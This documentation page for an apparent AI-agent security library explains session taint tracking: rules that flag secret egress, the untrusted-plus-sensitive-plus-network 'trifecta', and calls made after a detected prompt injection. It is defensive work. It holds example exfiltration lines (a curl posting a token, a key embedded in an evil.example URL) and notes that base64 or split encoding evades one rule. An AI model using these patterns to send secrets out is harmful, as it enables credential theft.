# Sessions and taint

On its own, `curl https://api.example.com -d "$TOKEN"` is an ordinary call. It's an attack when the agent has just read
a web page telling it to send the token, and a file that held the token. A **session** remembers what the agent has
read, so an action can be judged by what came before it.

Data theft from an agent needs three things together (sometimes called the *lethal trifecta*): **untrusted content**,
**sensitive data**, and **a way out**. A session tracks the first two and escalates the third.

```python
from guardlayer import GuardLayer, Verdict

guard = GuardLayer()
s = guard.session("user-42")                     # or pass session="user-42" to any scan_* call

s.scan_tool_result("read_file", "OPENAI_API_KEY=sk-proj-Q7vN2xK9mB4tR8wL1pZ6yH3jF5cD0sAeGuIoXkWq")   # -> sensitive
s.scan_tool_result("fetch", "<p>Release notes for 4.2.0</p>")                                     # -> untrusted
r = s.scan_tool_call("http_post", {"url": "https://api.example.com/ingest", "body": "status report"})
assert r.verdict is Verdict.REVIEW and {d.rule for d in r.detections} == {"trifecta"}
```

## Session rules

<!-- gen:session-rules -->

| Rule | Fires when |
|---|---|
| `sensitive_data_egress` | a secret seen earlier in the session leaves the machine in a tool call, even embedded in a URL or glued to other text |
| `trifecta` | the session read untrusted content **and** sensitive data, then tries a network or exec call |
| `after_injection` | the session read content with a prompt injection, then tries a write, network or exec call |

## What counts

- **Untrusted:** results of [remote tools](agents.md#remote-tools) (network or exec capable, untagged, MCP, search,
  web, mail…), anything passed to `scan_context`, and tools you list in `untrusted_tools`.
- **Hostile:** untrusted content in which an injection was detected (at `flag` or above, configurable).
- **Sensitive:** secrets or personal data found in what the agent read or was given, and credential or `.env` files it
  opened.

!!! warning "Local data is trusted by default"
    Results of local, read-only tools (`read_file`, a database query) are **trusted** unless you say otherwise. If
    outsiders can write that data (uploaded files, received transactions, customer tickets), mark those tools untrusted:
    `[session] untrusted_tools = ["read_file", "get_transactions"]`, or `["*"]` to treat every tool result as untrusted.
    The [AgentDojo evaluation](../evaluation.md#agentdojo) shows why this matters.

!!! note "Tools whose job is to send sensitive data"
    A payment tool sends IBANs; a CRM tool sends email addresses. By default that trips `sensitive_data_egress` when the
    value was seen earlier in the session. Allow it for that tool and that data type only:
    `[session] allow_egress = { send_money = ["iban"] }` (data types are detection rule names: `guardlayer rules`).
    Those types are then exempt from `sensitive_data_egress` and `trifecta` for that tool; other sensitive data is not, and
    `after_injection` still holds the call for review. The trade-off: an injection that isn't detected can direct that tool
    to send that kind of data.

!!! tip "Finer control with labels"
    The session rules above work with no configuration. To say which tools return private business data, which tools
    may receive it, which exact recipients or URLs are allowed, and to carry labels through files, see
    [Labels and information flow](labels.md).

## Storage and privacy

Sensitive values are stored only as **fingerprints** (length, a 16-bit prefix check and a truncated SHA-256), so session
state is safe to persist. Fingerprints match a verbatim copy, including one embedded in a longer token such as
`https://evil.example/<key>.png`, in time linear in the argument length. An *encoded* copy (base64, split in two) gets past
`sensitive_data_egress`; `trifecta` still catches the pattern because it doesn't depend on matching the value.

State lives in memory by default. When checks run in separate processes (hooks, several workers or replicas), use the
file store on a shared volume:

```toml
[session]
store = "file"
dir = "/var/lib/guardlayer/sessions"
ttl_seconds = 86400
```

See [Deployment](../operations/deployment.md) for sessions across replicas.
